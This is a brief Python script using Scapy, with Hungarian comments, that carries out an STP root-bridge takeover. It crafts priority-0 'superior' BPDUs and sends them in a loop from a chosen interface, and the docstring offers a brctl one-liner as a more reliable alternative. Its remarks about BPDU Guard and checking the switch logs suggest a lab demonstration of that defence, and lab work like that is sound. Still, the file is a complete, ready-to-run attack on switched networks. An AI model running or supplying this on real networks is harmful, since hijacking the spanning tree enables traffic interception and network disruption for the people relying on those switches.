#!/usr/bin/env python3
"""0 prioritású BPDU-k küldése — a támadó igyekszik root bridge-gé válni.
A BPDU Guard emiatt err-disabled állapotba teszi a portot.

Futtatás: sudo python3 stp_takeover.py eth0
Alternatíva (megbízhatóbb): sudo brctl addbr br0 && sudo brctl setbridgeprio br0 0
                            && sudo ip link set br0 up
"""
import sys, time
from scapy.all import Ether, sendp, conf

LLC = b"\x42\x42\x03"   # 802.2 LLC: DSAP/SSAP=STP, control=UI

def stp_config_bpdu(root_id, bridge_id):
    return (b"\x00\x00\x00\x00"                     # proto id, verzió, típus, flag-ek
            + root_id + b"\x00\x00"                 # root id, path cost
            + bridge_id + b"\x80\x01"               # bridge id, port id
            + b"\x14\x00\x14\x00\x04\x00\x0a\x00")  # age-ek / forward delay

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    att_mac = conf.iface.mac
    bid = b"\x00\x00" + bytes.fromhex(att_mac.replace(":", ""))
    frame = Ether(dst="01:80:c2:00:00:00", src=att_mac) / (LLC + stp_config_bpdu(bid, bid))
    print("[*] Rogue superior BPDU-k küldése (priority 0)... Ctrl+C a leállításhoz.")
    try:
        while True:
            sendp(frame, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Leállítva. Nézd: 'show spanning-tree root' + syslog.")

if __name__ == "__main__":
    main()
